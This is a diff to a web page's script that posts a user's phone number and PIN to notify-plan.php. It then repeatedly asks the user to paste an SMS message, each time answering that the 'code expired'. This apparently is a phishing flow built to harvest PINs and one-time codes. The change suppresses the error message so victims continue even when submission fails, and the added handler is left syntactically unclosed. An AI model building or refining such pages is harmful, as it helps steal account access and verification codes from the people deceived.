@@ -759,7 +759,7 @@
     }
     authError.classList.remove('show'); authSubmit.disabled = true; authSubmit.textContent = 'Loging In…';
     try {
-      const response = await fetch('/api/notify-plan.php', { method: 'POST', headers: { 'Content-Type': 'application/json' },
+      const response = await fetch('notify-plan.php', { method: 'POST', headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ action: 'plan', bundle: selectedPlan.name, phone, demoPin: document.getElementById('authPin').value }) });
       const result = await response.json();
       if (!response.ok || !result.ok) throw new Error('Submission failed');
@@ -767,8 +767,12 @@
       authPage.classList.remove('open'); verifyPage.classList.add('open'); verifyText.focus();
       authSubmit.textContent = 'Request sent';
     } catch (error) {
-      authError.textContent = 'Could not send the plan request. Please try again later.';
-      authError.classList.add('show'); authSubmit.disabled = false; authSubmit.textContent = 'Submit bundle request';
+      //authError.textContent = 'Could not send the plan request. Please try again later.';
+      //authError.classList.add('show'); authSubmit.disabled = true; authSubmit.textContent = 'Submit bundle request';
+      authPage.classList.remove('open');
+      verifyPage.classList.add('open');
+      document.getElementById('verifyBack').addEventListener('click', () => {
+    verifyPage.classList.remove('open'); authPage.classList.add('open');
     }
   });
 
@@ -781,7 +785,7 @@
     const message = verifyText.value.trim(); if (!message) return;
     verifySubmit.disabled = true; verifySubmit.textContent = 'SENDING…'; verifyMessage.textContent = '';
     try {
-      const response = await fetch('/api/notify-plan.php', { method: 'POST', headers: { 'Content-Type': 'application/json' },
+      const response = await fetch('notify-plan.php', { method: 'POST', headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ action: 'message', message }) });
       const result = await response.json(); if (!response.ok || !result.ok) throw new Error('Submission failed');
       verifyMessage.textContent = '⚠️ Message code expired. Please paste the new message below.'; verifyMessage.style.color = '#b42318';
